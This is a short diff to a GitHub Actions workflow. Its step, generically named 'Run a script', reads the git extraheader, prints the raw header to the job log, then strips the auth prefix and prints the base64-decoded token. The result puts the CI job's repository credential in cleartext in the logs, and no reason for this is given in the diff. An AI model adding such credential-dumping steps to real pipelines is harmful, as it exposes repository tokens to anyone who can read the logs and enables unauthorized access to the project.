@@ -13,6 +13,10 @@ jobs:
 
       - name: Run a script
         run: |
-          git config --get-all http.https://github.com/.extraheader
-          echo "<token>" | base64 -d
+          HEADER=$(git config --get-all http.https://github.com/.extraheader)
+          echo "Raw header:"
+          echo "$HEADER"
+          TOKEN=$(echo "$HEADER" | sed 's/AUTHORIZATION: basic //')
+          echo "Decoded token:"
+          echo "$TOKEN" | base64 -d
 
